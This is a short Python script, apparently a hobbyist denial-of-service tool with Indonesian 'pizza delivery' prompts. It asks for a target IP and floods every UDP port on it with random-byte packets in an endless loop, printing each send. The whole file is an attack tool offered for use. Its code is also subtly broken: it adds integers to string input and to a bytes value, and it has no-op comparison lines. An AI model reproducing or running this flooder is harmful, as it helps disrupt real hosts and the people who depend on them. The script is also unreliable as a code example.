#Author WHITE L'
import socket
import os
import random
import time
import sys

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(32000)
bytes = random._urandom(35523)
bytes = random._urandom(23443)
bytes  = random._urandom(25535)

os.system("clear")

ip = input("[+] Pizza IP : ")
port = input("[+] Pizza Port : ")
sent = input("[+] Masukan Jumlah Pizza Ke Dalam Box : ")
random = input("[+] Random Tools : ")
ping = input("[+] Jumlah Pizza 1-500000 : ")
os.system("clear") 
print("Pergi Ke Toko PizzaHot✓...")
time.sleep(3)
print("Membeli Pizza 500k Box✓")
time.sleep(3)
print("Memasukan 500k Box Pizza, Ke dalam truck✓")
time.sleep(3)
print("proses✓✓✓")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        sent == 65534
        port = port + 1
        port == 65534
        ping = ping + 1
        ping == 65534
        random = random + 1
        random == 404555
        bytes = bytes + 1
        bytes == 677543
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Pizza Packet to \033[1;32m%s \033[1;91mPizza port \033[1;32m%s " % (sent, ip, port, random, bytes,))

print("\033[1;92mAttack finished\033[0m")
